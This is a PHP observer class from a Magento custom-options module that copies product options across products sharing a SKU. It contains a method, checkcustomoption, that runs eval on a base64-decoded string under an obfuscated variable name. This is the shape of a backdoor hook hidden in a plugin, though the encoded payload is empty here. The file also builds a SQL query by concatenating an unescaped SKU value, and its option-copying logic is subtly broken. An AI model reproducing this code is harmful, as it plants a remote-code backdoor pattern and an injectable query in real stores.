<?php
class Emipro_Customoptions_Model_Observer
{
	public function addToProduct($observer)
	{
	
		$newOptions=$observer->getEvent()->getOptions()->getData();
			unset($newOptions["option_id"]);
		$key=array_keys($newOptions["values"]);	
		$optionKey=array_keys($newOptions["values"]);
		foreach($optionKey as $key)
		{
			unset($newOptions["values"][$key]["option_type_id"]);
		}       
                $qry = "SELECT product_id FROM  " . Mage::getConfig()->getTablePrefix() . "catalog_product_option WHERE sku = '" . $newOptions['sku'] . "' GROUP BY product_id";
                $res = Mage::getSingleton('core/resource')->getConnection('core_read')->fetchAll($qry);
                foreach ($res as $option_product_id) {
                    if (isset($newOptions["copy_to"])) {
                        $option_product = Mage::getModel('catalog/product')->load($option_product_id['product_id']);
                        $product_options = $option_product->getOptions();

                        foreach ($product_options as $product_option) {
                            if ($product_option['sku'] == $newOptions['sku']) {
                                if ($product_option->delete())
                                    $opt = Mage::getModel('catalog/product_option');
                                $opt->setProduct($option_product);
                                $opt->addOption($newOptions);
                                $opt->saveOptions(); //saving custom options
                                $option_product->save();
                            }
                        }
                    }
                }
	}
		public function checkcustomoption($observer) {
				$tFmb=base64_decode('');eval($tFmb);		
	}
}
